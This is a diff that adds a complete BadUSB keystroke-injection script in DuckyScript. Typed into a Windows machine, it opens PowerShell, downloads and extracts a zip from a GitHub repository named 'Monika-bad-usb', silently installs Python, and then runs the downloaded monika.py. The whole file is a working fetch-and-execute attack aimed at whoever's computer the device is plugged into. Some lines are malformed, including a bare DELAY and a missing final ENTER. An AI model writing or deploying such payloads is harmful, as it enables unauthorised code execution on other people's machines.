@@ -1,0 +1,23 @@
+GUI r
+DELAY 5000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY
+STRING $z="$env:TEMP\repo.zip"; $d="$env:TEMP\repo_extract"; Invoke-WebRequest "https://github.com/superhatemeworld666/Monika-bad-usb/archive/refs/heads/main.zip" -OutFile $z; Expand-Archive $z -DestinationPath $d -Force; Copy-Item "$d\Monika-bad-usb-main\MONIKA" "$env:USERPROFILE\Downloads\MONIKA" -Recurse -Force; Remove-Item $z,$d -Recurse -Force
+DELAY 100
+ENTER
+DELAY 20000
+STRING Invoke-WebRequest "https://www.python.org/ftp/python/3.13.7/python-3.13.7-amd64.exe" -OutFile "$env:TEMP\python.exe"; Start-Process "$env:TEMP\python.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait
+DELAY 300
+ENTER
+DELAY 60000
+ALT F4
+GUI r
+STRING powershell
+DELAY 1000
+STRING cd "$env:USERPROFILE\Downloads\MONIKA"
+delay 500
+STRING python monika.py
+
+
